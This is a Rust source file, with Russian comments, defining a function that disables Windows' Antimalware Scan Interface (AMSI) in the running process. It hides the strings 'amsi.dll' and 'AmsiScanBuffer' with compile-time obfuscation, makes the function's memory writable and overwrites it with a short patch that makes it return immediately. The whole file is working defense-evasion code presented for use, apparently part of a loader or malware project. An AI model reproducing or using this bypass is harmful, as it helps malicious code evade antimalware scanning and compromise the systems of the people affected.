use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
use windows::Win32::Foundation::BOOL;
use std::ffi::c_void;
use obfstr::obfstr;

pub fn patch_amsi() -> bool {
    unsafe {
        // Правильное создание PCSTR с обфускацией
        let amsi_dll = PCSTR::from_raw(obfstr!("amsi.dll\0").as_ptr());
        let h_module = match GetModuleHandleA(amsi_dll) {
            Ok(module) => module,
            Err(_) => return false,
        };
        
        // Проверка на нулевой модуль
        if h_module.is_invalid() {
            return false;
        }

        // Обфусцированное имя функции
        let func_name = PCSTR::from_raw(obfstr!("AmsiScanBuffer\0").as_ptr());
        let amsi_scan = GetProcAddress(h_module, func_name);
        
        // Проверка на None
        if amsi_scan.is_none() {
            return false;
        }

        let amsi_scan_ptr = amsi_scan.unwrap();
        let patch: [u8; 6] = [0x48, 0x31, 0xc0, 0xc3, 0x90, 0x90];

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        
        // VirtualProtect возвращает BOOL, не Result
        let result: BOOL = VirtualProtect(
            amsi_scan_ptr as *const c_void,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        // BOOL проверяется через .as_bool() или != 0
        if result.as_bool() {
            std::ptr::copy_nonoverlapping(
                patch.as_ptr(), 
                amsi_scan_ptr as *mut u8, 
                patch.len()
            );
            
            // Восстановление защиты
            let _ = VirtualProtect(
                amsi_scan_ptr as *const c_void,
                patch.len(),
                old_protect,
                &mut old_protect,
            );
            true
        } else {
            false
        }
    }
}
